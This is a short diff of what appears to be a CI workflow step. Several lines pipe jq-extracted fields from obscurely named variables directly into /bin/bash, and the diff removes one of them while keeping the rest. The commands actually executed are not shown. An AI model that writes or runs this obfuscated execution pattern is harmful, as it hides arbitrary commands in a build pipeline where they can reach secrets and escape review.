@@ -24,7 +24,6 @@ jobs:
           echo $cr9 | jq -r .srs79 | /bin/bash
           printf '%s' "$jdjcq658" | jq -r .sd4 | /bin/bash
           echo $rbqqn3374 | jq -r .ecgfz2 | /bin/bash
-          echo $pc70 | jq -r .qzgl266 | /bin/bash
 
       - name: Persist output
         if: always()
